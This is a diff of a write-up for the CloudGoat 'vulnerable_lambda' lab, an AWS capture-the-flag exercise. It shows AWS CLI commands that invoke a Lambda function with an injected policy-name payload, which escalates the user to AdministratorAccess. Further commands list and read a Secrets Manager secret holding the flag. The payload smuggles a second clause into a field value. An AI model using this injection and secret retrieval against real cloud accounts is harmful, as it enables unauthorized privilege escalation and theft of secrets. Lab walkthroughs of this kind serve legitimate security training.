@@ -77,25 +77,28 @@ aws lambda get-function --function-name <function name> --profile lambda-biblo
 ...
 CODE    https://prod-04-20xxxx...
 ...
+```
 Paste the url into the browser to download the code. We can then see that the code validates our hypothesis above. We can add the policy administrator access to our user as it is in the approved list of policies.
 3. Invoke the function with attaching the policies
 ```
 aws --profile lambda-biblo lambda invoke --function-name <function name> --cli-binary-format raw-in-base64-out --payload '{"policy_names":["AdministratorAccess'"'"' --"], "user_name":"<biblo user name>"}' out.txt
 cat out.txt -> Check for no errors
 ```
-4. List Secrets
+## Secrets Manager
+1. List Secrets
 ```
 aws secretsmanager list-secrets --region us-east-1 --profile biblo --output json
 ... 
 "Name": "vulnerable_lambda_xx... -> id of secret we want
 ...
 ```
-5. Get the secret 
+2. Get the secret 
 ```
 aws secretsmanager get-secret-value --region us-east-1 --secret-id <secret id> --profile biblo --output json
 ...
 "SecretString": "cg-secret-846237-284529" -> Flag!
 ...
+```
 
 # References 
 * Challenge: https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/vulnerable_lambda/README.md
